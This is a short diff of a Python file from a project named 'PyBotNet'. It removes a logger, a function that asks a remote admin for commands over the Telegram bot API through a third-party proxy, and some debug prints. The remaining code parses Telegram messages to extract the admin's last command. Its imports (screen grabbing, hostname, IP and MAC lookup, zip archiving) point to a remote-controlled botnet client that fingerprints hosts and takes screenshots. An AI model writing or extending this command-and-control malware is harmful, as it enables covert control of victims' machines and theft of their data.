@@ -10,21 +10,12 @@ import platform
 import time
 import zipfile
 import os
-import logging
 
 from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
 from PIL import ImageGrab
 
-log_level = logging.INFO
-my_logger = logging
-logger = my_logger.getLogger('PyBotNet')
-
-def get_runtime_command(ADMIN_CHAT_ID: str, TELEGRAM_TOKEN: str,  logger=logger):
-    api_url = make_send_message_api_url(TELEGRAM_TOKEN,ADMIN_CHAT_ID,"Send Your Command [30s] :")
-    post_data_by_third_party_proxy(api_url, logger)
-    time.sleep(15)
 
 def get_current_epoc_time() -> float:
     return time.time()
@@ -228,7 +219,6 @@ def get_last_update_id(messages: list, ADMIN_CHAT_ID: str, logger):
         return False
 
     for message in messages[::-1]:
-        print(f"last ====> {message}")
         try:
             last_message_chat_id = str(message['message']['chat']['id'])
             update_id = str(message["update_id"])
@@ -268,7 +258,6 @@ def extract_last_admin_command(messages: list, ADMIN_CHAT_ID: str, TELEGRAM_TOKE
     message_text = False
 
     for message in messages[::-1]:
-        print(f"last_cm : ===> {message}")
         try:
             last_message_chat_id = str(message['message']['chat']['id'])
             last_text = message['message']['text']
